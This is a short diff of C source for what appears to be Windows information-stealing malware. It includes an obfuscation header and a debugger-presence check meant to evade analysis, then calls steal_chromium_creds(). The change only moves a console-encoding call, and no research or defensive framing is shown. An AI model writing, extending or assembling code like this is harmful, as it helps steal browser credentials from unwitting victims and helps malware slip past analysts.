@@ -11,10 +11,6 @@
 #include "obfuscation.h"
 
 int main(void) {
-  // Puts the console in UTF-8
-  // Allows us to print non-ASCII characters for debug
-  SetConsoleOutputCP(CP_UTF8);
-
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
@@ -38,6 +34,10 @@ int main(void) {
         GetLastError());
 #endif
   }
+
+  // Puts the console in UTF-8
+  // Allows us to print non-ASCII characters for debug
+  SetConsoleOutputCP(CP_UTF8);
 
   steal_chromium_creds();
 
